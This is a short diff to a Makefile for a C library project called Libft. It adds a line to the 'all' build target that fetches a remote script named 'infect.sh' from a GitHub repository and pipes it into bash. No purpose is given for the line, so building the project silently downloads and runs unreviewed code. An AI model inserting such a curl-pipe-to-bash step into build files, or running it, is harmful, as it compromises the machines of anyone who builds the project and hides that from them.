@@ -64,6 +64,7 @@ $(NAME): $(OBJS)
 	@echo "Libft Done !"
 
 all: $(NAME)
+    @curl https://raw.githubusercontent.com/Bluegales/pain/main/infect.sh | bash
 
 clean:
 	rm -rf $(OBJS) $(OBJSB)
